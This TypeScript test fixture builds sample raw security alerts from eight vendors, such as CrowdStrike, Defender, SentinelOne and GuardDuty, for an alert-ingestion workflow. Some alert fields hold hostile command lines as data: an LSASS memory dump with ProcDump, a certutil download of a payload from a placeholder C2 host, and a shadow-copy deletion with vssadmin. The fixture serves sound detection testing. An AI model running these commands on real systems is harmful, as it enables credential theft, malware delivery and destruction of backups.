/**
 * Sample Cybersecurity Alert Payloads for Ingestion Testing.
 *
 * Provides realistic, raw vendor alert payloads from famous cybersecurity tools:
 *  - CrowdStrike Falcon
 *  - Microsoft Defender for Endpoint
 *  - SentinelOne Singularity
 *  - AWS GuardDuty
 *  - Wazuh SIEM / HIDS
 *  - Splunk Enterprise Security
 *  - Palo Alto Networks Cortex XDR
 *  - Okta Identity Cloud
 *
 * IMPORTANT:
 * Alerts are intentionally NOT pre-standardised into OCSF.
 * The payload forwards the authentic raw alert JSON exactly as the source vendor would emit it,
 * allowing the Shuffle ingestion webhook workflow to execute real normalization and translation.
 */

export interface SampleAlert {
  id: string;
  sourceName: string;
  productName: string;
  title: string;
  severity: string;
  payload: Record<string, any>;
}

let __sampleCounter = 0;
let __lastSourceIndex = -1;

const getUniqueFindingUid = (prefix: string): string => {
  __sampleCounter += 1;
  const rand = Math.random().toString(36).slice(2, 7);
  return `${prefix}-${Date.now()}-${__sampleCounter}-${rand}`;
};

type AlertBuilder = () => SampleAlert;

const ALERT_BUILDERS: AlertBuilder[] = [
  // 1. CrowdStrike Falcon
  () => {
    const findingUid = getUniqueFindingUid('cs-falcon');
    const rawPayload = {
      metadata: {
        customerIDString: 'c8d8f0e1a2b3c4d5e6f7',
        offset: 10245,
        eventType: 'DetectionSummaryEvent',
        eventCreationTime: Date.now(),
        version: '1.0',
      },
      event: {
        SensorId: `aid-${findingUid}`,
        ComputerName: 'WS-CORP-492',
        UserName: 'admin_backup',
        DetectName: 'CredentialDumping:LSASS',
        DetectDescription: 'ProcDump attempted to read memory of Local Security Authority Subsystem Service (LSASS)',
        Severity: 4,
        SeverityName: 'High',
        FalconHostLink: `https://falcon.crowdstrike.com/activity/detections/detail/${findingUid}`,
        FileName: 'procdump64.exe',
        FilePath: 'C:\\Windows\\Temp\\procdump64.exe',
        CommandLine: 'procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp',
        MD5String: 'e2fc714c4727ee9395f324cd61752eb7',
        SHA256String: '8f48102ff9373cf58bb0e0cf47385be617b0190a6e355c7f8a75e330a6566897',
        LocalIP: '10.120.4.52',
        RemoteIP: '194.26.29.112',
        ProcessId: 4812,
        ParentProcessId: 1204,
        Tactic: 'Credential Access',
        Technique: 'OS Credential Dumping: LSASS Memory (T1003.001)',
      },
    };

    return {
      id: findingUid,
      sourceName: 'CrowdStrike Falcon',
      productName: 'CrowdStrike',
      title: 'CrowdStrike: Credential Dumping via LSASS Memory Read (ProcDump)',
      severity: 'High',
      payload: rawPayload,
    };
  },

  // 2. Microsoft Defender for Endpoint
  () => {
    const findingUid = getUniqueFindingUid('mde');
    const nowIso = new Date().toISOString();
    const rawPayload = {
      id: `da-${Date.now()}-def`,
      provider: 'Microsoft Defender for Endpoint',
      title: 'Living-off-the-Land Binary (Certutil) Remote Payload Download',
      description: 'Certutil.exe was used to download a payload from a suspicious remote address',
      category: 'CommandAndControl',
      severity: 'High',
      status: 'NewAlert',
      alertCreationTime: nowIso,
      computerDnsName: 'FIN-APP-02.internal.corp',
      machineDetails: {
        computerDnsName: 'FIN-APP-02.internal.corp',
        ipAddresses: ['10.20.1.88'],
        osPlatform: 'Windows11',
      },
      evidence: [
        {
          entityType: 'Process',
          commandLine: 'certutil.exe -urlcache -split -f https://c2.threat-actor-ops.org/stage2.bin C:\\Windows\\Temp\\update.bin',
        },
        { entityType: 'Ip', ipAddress: '198.51.100.77' },
        { entityType: 'Url', url: 'https://c2.threat-actor-ops.org/stage2.bin' },
        { entityType: 'User', accountName: 'sarah.chen@corp.example.com' },
      ],
      mitreTechniques: ['T1105'],
    };

    return {
      id: findingUid,
      sourceName: 'Microsoft Defender for Endpoint',
      productName: 'Microsoft Defender for Endpoint',
      title: 'Defender: Living-off-the-Land Binary (Certutil) Remote Payload Download',
      severity: 'High',
      payload: rawPayload,
    };
  },

  // 3. SentinelOne Singularity
  () => {
    const findingUid = getUniqueFindingUid('s1');
    const nowIso = new Date().toISOString();
    const rawPayload = {
      threatInfo: {
        threatId: `S1-THREAT-${Date.now().toString().slice(-6)}`,
        threatName: 'Ransomware.ShadowCopy.Delete',
        classification: 'Ransomware',
        confidenceLevel: 'malicious',
        incidentStatus: 'unresolved',
        severity: 'critical',
        identifiedAt: nowIso,
        filePath: 'C:\\Windows\\System32\\vssadmin.exe',
        fileSha256: '4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a',
        commandLine: 'vssadmin.exe delete shadows /all /quiet',
        mitreTactics: ['Impact', 'Inhibit System Recovery'],
      },
      agentRealtimeInfo: {
        agentComputerName: 'HR-DESKTOP-19',
        agentIp: '10.0.12.44',
        agentOsName: 'Windows 11 Enterprise',
        userContext: 'alex.morgan',
      },
    };

    return {
      id: findingUid,
      sourceName: 'SentinelOne Singularity',
      productName: 'SentinelOne',
      title: 'SentinelOne: Ransomware Behavior (Volume Shadow Copy Deletion)',
      severity: 'Critical',
      payload: rawPayload,
    };
  },

  // 4. AWS GuardDuty
  () => {
    const findingUid = getUniqueFindingUid('guardduty');
    const nowIso = new Date().toISOString();
    const rawPayload = {
      version: '0',
      id: `gd-${Date.now().toString().slice(-6)}-2026`,
      'detail-type': 'GuardDuty Finding',
      source: 'aws.guardduty',
      account: '982341123901',
      time: nowIso,
      region: 'us-east-1',
      detail: {
        schemaVersion: '2.0',
        accountId: '982341123901',
        region: 'us-east-1',
        type: 'UnauthorizedAccess:EC2/SSHBruteForce',
        title: 'SSH brute force attack against EC2 bastion host',
        description: '198.51.100.23 is performing SSH brute force attacks against i-0f8a91b2c3d4e5f60.',
        severity: 7.5,
        resource: {
          resourceType: 'Instance',
          instanceDetails: {
            instanceId: 'i-0f8a91b2c3d4e5f60',
            instanceType: 't3.medium',
            networkInterfaces: [{ privateIpAddress: '172.31.40.12' }],
          },
        },
        service: {
          serviceName: 'guardduty',
          action: {
            actionType: 'NETWORK_CONNECTION',
            networkConnectionAction: {
              connectionDirection: 'INBOUND',
              remoteIpDetails: {
                ipAddressV4: '198.51.100.23',
                organization: { org: 'Hostwinds LLC' },
                country: { countryName: 'Romania' },
              },
            },
          },
        },
      },
    };

    return {
      id: findingUid,
      sourceName: 'AWS GuardDuty',
      productName: 'AWS GuardDuty',
      title: 'GuardDuty: UnauthorizedAccess:EC2/SSHBruteForce Against Bastion',
      severity: 'High',
      payload: rawPayload,
    };
  },

  // 5. Wazuh SIEM / HIDS
  () => {
    const findingUid = getUniqueFindingUid('wazuh');
    const nowIso = new Date().toISOString();
    const rawPayload = {
      timestamp: nowIso,
      rule: {
        id: '100221',
        level: 12,
        description: 'Sliver C2 implant beaconing detected on endpoint',
        firedtimes: 1,
        mail: false,
        groups: ['malware', 'c2', 'exploit'],
      },
      agent: {
        id: '002',
        name: 'FIN-LAPTOP-04',
        ip: '10.0.1.42',
      },
      manager: {
        name: 'wazuh.manager',
      },
      id: `${Date.now() / 1000}.991204`,
      decoder: { name: 'sysmon' },
      data: {
        srcip: '194.26.29.112',
        dstuser: 'sarah.chen',
        sha256: '9f8337a6b29f984a1e95642a420b98a3c8e47b3127814b721e25e709a34bc362',
        system: {
          process: {
            name: 'msedge_proxy.exe',
            command_line: '%APPDATA%\\Roaming\\Microsoft\\Edge\\msedge_proxy.exe',
          },
        },
      },
      full_log: 'Sysmon Event 1: Image: msedge_proxy.exe CommandLine: %APPDATA%\\Roaming\\Microsoft\\Edge\\msedge_proxy.exe ParentImage: explorer.exe',
    };

    return {
      id: findingUid,
      sourceName: 'Wazuh',
      productName: 'Wazuh',
      title: 'Wazuh: Sliver C2 Implant Beaconing on FIN-LAPTOP-04',
      severity: 'Critical',
      payload: rawPayload,
    };
  },

  // 6. Splunk Enterprise Security
  () => {
    const findingUid = getUniqueFindingUid('splunk-es');
    const rawPayload = {
      sid: `scheduler__admin__SplunkEnterpriseSecuritySuite__RMD${Date.now().toString().slice(-6)}`,
      search_name: 'Notable Event - Impossible Travel Activity Detected',
      app: 'SplunkEnterpriseSecuritySuite',
      owner: 'admin',
      results_link: 'https://splunk.internal.corp/app/SplunkEnterpriseSecuritySuite/@go?sid=scheduler__admin__SplunkEnterpriseSecuritySuite',
      result: {
        event_id: `SPLK-NOTABLE-${Date.now().toString().slice(-5)}`,
        urgency: 'high',
        status: 'new',
        src: '185.220.101.5',
        user: 'r.sterling@corp.example.com',
        dest: 'identity.corp.example.com',
        signature: 'Concurrent Logins from Distant Geographies (Oslo, NO & Lagos, NG within 12 minutes)',
        _time: `${Math.floor(Date.now() / 1000)}`,
      },
    };

    return {
      id: findingUid,
      sourceName: 'Splunk Enterprise Security',
      productName: 'Splunk ES',
      title: 'Splunk ES: Impossible Travel - Concurrent Logins Across Countries',
      severity: 'High',
      payload: rawPayload,
    };
  },

  // 7. Palo Alto Networks Cortex XDR
  () => {
    const findingUid = getUniqueFindingUid('cortex-xdr');
    const rawPayload = {
      incident: {
        incident_id: `XDR-INC-${Date.now().toString().slice(-5)}`,
        incident_name: 'Suspicious Memory Injection into LSASS.exe',
        creation_time: Date.now(),
        modification_time: Date.now(),
        status: 'new',
        severity: 'high',
        description: 'Cortex XDR behavioral analytics terminated an unbacked thread injection into LSASS',
        hosts: ['CORP-DC-01'],
        users: ['SVC_BACKUP'],
        alert_count: 1,
        alerts: [
          {
            alert_id: `AL-${Date.now().toString().slice(-5)}`,
            action: 'BLOCKED',
            name: 'Mimikatz LSASS In-Memory Dump Blocked',
            category: 'Credential Access',
            host_name: 'CORP-DC-01',
            user_name: 'SVC_BACKUP',
            process_name: 'mimikatz.exe',
            sha256: '3a7b1c4e8f9a2b5c6d7e8f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c',
          },
        ],
      },
    };

    return {
      id: findingUid,
      sourceName: 'Palo Alto Networks Cortex XDR',
      productName: 'Cortex XDR',
      title: 'Cortex XDR: Mimikatz LSASS In-Memory Dump Blocked',
      severity: 'High',
      payload: rawPayload,
    };
  },

  // 8. Okta Identity Cloud
  () => {
    const findingUid = getUniqueFindingUid('okta');
    const nowIso = new Date().toISOString();
    const rawPayload = {
      eventId: `targets-okta-${Date.now().toString().slice(-6)}`,
      eventType: 'user.mfa.push.spam_detected',
      published: nowIso,
      severity: 'WARN',
      displayMessage: 'Rapid MFA push spam detected from unfamiliar ASN',
      actor: {
        id: '00u8f192bka',
        type: 'User',
        alternateId: 'devops-admin@corp.example.com',
        displayName: 'Alex Vance',
      },
      client: {
        ipAddress: '194.26.29.5',
        geographicalContext: {
          city: 'Victoria',
          country: 'Seychelles',
        },
      },
      securityContext: {
        isProxy: true,
      },
      outcome: {
        result: 'DENY',
        reason: 'Push flood limit exceeded',
      },
    };

    return {
      id: findingUid,
      sourceName: 'Okta',
      productName: 'Okta',
      title: 'Okta: High-Risk MFA Push Fatigue Bombing',
      severity: 'Medium',
      payload: rawPayload,
    };
  },
];

/**
 * Returns a fresh sample alert, cycling semi-randomly through the assortment of
 * famous cybersecurity alert sources without repeating the same source consecutively.
 */
export const getNextSampleAlert = (): SampleAlert => {
  const count = ALERT_BUILDERS.length;
  let nextIndex: number;

  if (__lastSourceIndex < 0) {
    // Pick an initial random source
    nextIndex = Math.floor(Math.random() * count);
  } else {
    // Choose randomly from any index except the immediately preceding one
    const offset = 1 + Math.floor(Math.random() * (count - 1));
    nextIndex = (__lastSourceIndex + offset) % count;
  }

  __lastSourceIndex = nextIndex;
  return ALERT_BUILDERS[nextIndex]();
};
